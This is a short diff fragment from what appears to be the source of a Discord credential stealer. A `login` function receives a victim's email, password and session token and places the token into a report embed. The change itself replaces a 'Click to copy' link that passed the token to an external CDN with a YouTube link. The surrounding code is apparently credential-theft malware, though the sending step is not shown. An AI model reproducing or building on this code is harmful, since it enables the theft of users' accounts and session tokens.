@@ -611,7 +611,7 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '<a:944007295417843743:959785231982931979> Token:',
-            value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/{token})`,
+            value: `\`${token}\` [Click to copy](https://www.youtube.com/watch?v=dQw4w9WgXcQ)`,
             inline: false,
           },
           {
